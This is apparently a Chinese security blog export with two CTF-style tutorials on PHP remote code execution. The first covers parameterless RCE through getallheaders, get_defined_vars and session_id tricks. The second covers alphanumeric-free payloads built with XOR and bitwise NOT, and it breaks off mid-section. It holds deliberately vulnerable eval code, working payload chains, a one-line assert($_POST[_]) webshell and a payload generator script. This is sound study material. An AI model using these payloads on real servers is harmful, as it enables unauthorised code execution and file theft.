<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>

<p>将数组倒置取第一个元素相当于<code>end()</code></p>
<p>小小举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>

<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
<p>我们还可以用以下方法得到全局变量的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
<p>可以利用<code>getcwd()</code>获取当前目录</p>
<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
<ul>
<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
<ul>
<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
</li>
<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
</li>
<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
</li>
</ul>
</li>
<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
</li>
<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p><code>chdir()</code></p>
<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>

<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>

<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>

<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>

<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>无数字字母RCE学习记录</title>
    <url>/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/</url>
    <content><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的思路就是利用各种非数字字母的字符，经过各种变换（<strong>异或</strong>、<strong>取反</strong>、<strong>自增</strong>），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
<span id="more"></span>

<h2 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h2><h3 id="异或"><a href="#异或" class="headerlink" title="^异或"></a><code>^</code>异或</h3><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p>
<p><img src="https://s2.loli.net/2023/11/18/xRKVB7Md5zJTIk4.png" alt="vmfHFZrN9GLSC8j"></p>
<p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p>
<p><img src="https://s2.loli.net/2023/11/18/hNXOnJiDfgxBQlv.png" alt="image.png"></p>
<p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了</p>
<p><img src="https://s2.loli.net/2023/11/18/bIaTjS4VFJ8l69q.png" alt="image.png"></p>
<p>或者直接上脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;^&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>; <span class="comment">//构造出assert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>; <span class="comment">//构造出_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>; <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>;<span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<h3 id="取反"><a href="#取反" class="headerlink" title="~取反"></a><code>~</code>取反</h3><h4 id="取反规则"><a href="#取反规则" class="headerlink" title="取反规则"></a>取反规则</h4><h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">12</span>;</span><br><span class="line"><span class="variable">$b</span> = ~<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>(-<span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h5 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h5><p>32位表示二进制的12：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000 0000 0000 0000 0000 0000 1100</span><br></pre></td></tr></table></figure>

<p>0与1互换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>
<p>观察0与1互换后的结果：从左向右看，第一位0正1符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>

<p>负数是用补码表示的，补码是原码取反+1，也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>

<p>是某个数取反+1得到的。也就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0010</span><br></pre></td></tr></table></figure>

<p>计算的-13</p>
<h4 id="如何取反"><a href="#如何取反" class="headerlink" title="如何取反"></a>如何取反</h4><p>取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>
<h5 id="字母直接取反"><a href="#字母直接取反" class="headerlink" title="字母直接取反"></a>字母直接取反</h5><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p>
<p><img src="https://s2.loli.net/2023/11/18/smvxWOyJXHwUG2N.png" alt="image.png"></p>
